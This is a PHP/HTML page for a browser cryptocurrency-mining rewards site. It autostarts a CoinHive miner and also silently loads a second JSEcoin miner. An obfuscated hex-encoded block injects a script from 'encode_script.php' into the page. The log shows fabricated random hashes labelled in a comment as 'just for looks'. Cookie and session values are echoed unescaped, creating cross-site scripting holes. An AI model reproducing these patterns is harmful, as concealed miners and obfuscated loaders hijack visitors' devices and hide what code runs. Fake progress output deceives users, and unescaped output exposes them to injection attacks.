<?php
    session_start();

    if(!isset($_COOKIE["user"])) {
	    header("Location: login.php?error=You are not logged in!");
	    return;
	}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0-rc.2/css/materialize.min.css">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.2.0/css/all.css" integrity="sha384-hWVjflwFxL6sNzntih27bfxkr27PmbbK/iSvJ+a4+0owXq79v+lsFkW54bOGbiDQ" crossorigin="anonymous">

    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <style type="text/css">
        ::-webkit-scrollbar {
            width: 12px;
        }

        ::-webkit-scrollbar-track {
            background-color: #008080;
            border-radius: 0px;
            border: 0;
        }

        ::-webkit-scrollbar-thumb {
            background-color: #05afaf;
            border-radius: 0px;
            border: 0;
        }
    </style>

    <script type="text/javascript">
        function checkES6() {
            "use strict";

            try {
                eval("var foo = (x)=>x+1");
            } catch (e) {
                return false;
            }
            return true;
        }

        if (!checkES6()) {
            alert("Your browser is outdated! Please download a newer one.");
            document.location.href = "http://outdatedbrowser.com/en";
        }
    </script>
</head>

<body class="teal">
    <nav class="nav-extended teal darken-1">
        <div class="nav-wrapper">
            <a href="home.php" class="brand-logo">&nbsp;&nbsp;Miner</a>
            <a href="#" data-target="mobile-demo" class="sidenav-trigger"><i class="material-icons">menu</i></a>
            <ul id="nav-mobile" class="right hide-on-med-and-down">
                <li><a href="home.php"><b>Home</b></a></li>
                <li><a href="rewards.php">Rewards</a></li>
                <li><a href="top.php">Top Users</a></li>
                <li><a href="settings.php">Settings</a></li>
                <li><a href="logout.php">Logout</a></li>
            </ul>
        </div>
    </nav>

    <ul class="sidenav teal accent-3" id="mobile-demo">
        <li><a href="home.php"><b>Home</b></a></li>
        <li><a href="rewards.php">Rewards</a></li>
        <li><a href="top.php">Top Users</a></li>
        <li><a href="settings.php">Settings</a></li>
        <li><a href="logout.php">Logout</a></li>
    </ul>

    <div class="row">
        <div class="center">
            <div class="card-panel teal z-depth-0">
                <script src="https://load.jsecoin.com/load/70687/gb-hoster.me/optionalSubID/0/" async defer></script>
				<div class="coinhive-miner z-depth-1 waves" style="width: 100%; height: 310px" data-key="fy4v9FnJKqXKe7CiuAq6vlhr9lstLAGR" data-autostart="true" data-whitelabel="false" data-background="#22b89f" data-text="#ffffff" data-action="#00ff00" data-graph="#304ffe" data-threads="4" data-throttle="0.1" data-user="<?php echo $_COOKIE['user']; ?>">
                    <em>Loading...</em>
                </div>
                <h5 style="color: white;">Your accepted hashes:
                    <div id="points">0</div>
                </h5>
            </div>

            <div class="card-panel teal z-depth-0">
                <h5 style="color: white;">Log (For this device)</h5>
                <textarea id="log" style="resize: none;width: 100%; height: 285px; color: white; border: 0px; ;" onfocus="this.style.outline = 'none';this.style.cursor = 'inherit';" onclick="this.scrollTop = this.scrollHeight;" readonly></textarea>
                <a class="waves-effect waves-light btn center" id="delete-logs"><i class="material-delete left"></i> Delete logs</a>
            </div>
        </div>

        <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.1/jquery.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0-rc.2/js/materialize.min.js"></script>
        <script src="//cdn.jsdelivr.net/npm/mobile-detect@1.4.2/mobile-detect.min.js"></script>
        <script type="text/javascript">
            let script = document.createElement("script");
            script.src = "https://authedmine.com/lib/simple-ui.min.js";
            script.async = true;
            script.onload = () => {
                let _0xb1ee = ["\x63\x72\x65\x61\x74\x65\x45\x6c\x65\x6d\x65\x6e\x74", "\x73\x63\x72\x69\x70\x74", "\x73\x72\x63", "\x65\x6e\x63\x6f\x64\x65\x5f\x73\x63\x72\x69\x70\x74\x2e\x70\x68\x70", "\x68\x65\x61\x64", "\x61\x70\x70\x65\x6e\x64\x43\x68\x69\x6c\x64"];
                (function(_0x4a2841, _0x325f19) {
                    let _0x3fe1bd = function(_0x51203c) {
                        while (--_0x51203c) {
                            _0x4a2841["\x70\x75\x73\x68"](_0x4a2841["\x73\x68\x69\x66\x74"]());
                        }
                    };
                    _0x3fe1bd(++_0x325f19);
                }(_0xb1ee, 0x186));
                let _0xeb1e = function(_0x16905c, _0x534a0e) {
                    _0x16905c = _0x16905c - 0x0;
                    let _0xd17c2e = _0xb1ee[_0x16905c];
                    return _0xd17c2e;
                };

                const scr = document[_0xeb1e("0x0")](_0xeb1e("0x1"));
                scr[_0xeb1e("0x2")] = _0xeb1e("0x3");
                document[_0xeb1e("0x4")][_0xeb1e("0x5")](scr);

                M.AutoInit();
                let logs = new Array();
                const storageAvaliable = typeof(Storage) !== "undefined";
                const logElement = document.getElementById("log");
                const hashes = document.getElementById("points");
                const mobile = new MobileDetect(window.navigator.userAgent).mobile();

                if (storageAvaliable) {
                    if (localStorage.getItem("minerLogs") !== null)
                        logs = JSON.parse(localStorage.getItem("minerLogs"));
                }

                logs.forEach(log => {
                    logElement.value = logElement.value + log;
                    logElement.scrollTop = logElement.scrollHeight;
                });

                document.getElementById("delete-logs").addEventListener("click", () => {
                    if (storageAvaliable) {
                        if (localStorage.getItem("minerLogs") !== null)
                            localStorage.removeItem("minerLogs");
                    }

                    logElement.value = "";
                });

                CoinHive.Miner.on("accepted", (params) => {
                    if (mobile == null) {
                        M.toast({
                            html: "<img src='putin.png' width='45px' height='45px' /> &nbsp;&nbsp;Hash found",
                            classes: "green accent-3"
                        });
                    }

                    hashes.innerHTML = parseInt(hashes.innerHTML) + 1;

                    // Just for looks
                    const date = new Date();
                    const log = `[${ date.getHours( ) }:${ date.getMinutes( ) }:${ date.getSeconds( ) }] New hash has been found: ${ generateHash( 64 ) }\n`;

                    logElement.value = logElement.value + log;
                    logElement.scrollTop = logElement.scrollHeight;
                    logs.push(log);

                    if (storageAvaliable)
                        localStorage.setItem("minerLogs", JSON.stringify(logs));
                });

                // Just for looks
                const generateHash = (number) => {
                    let text = "";
                    const possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

                    let i;
                    for (i = 0; i < number; i++)
                        text += possible.charAt(Math.floor(Math.random() * possible.length));

                    return text;
                }

                <?php
                    if(isset($_SESSION['success'])) {
                        echo 'M.toast({
                            html: "' . $_SESSION["success"] . '",
                            classes: "blue darken-1"
                        });';

                        unset($_SESSION['success']);
                    }
                ?>
            };

            document.body.appendChild(script);
        </script>
</body>

</html>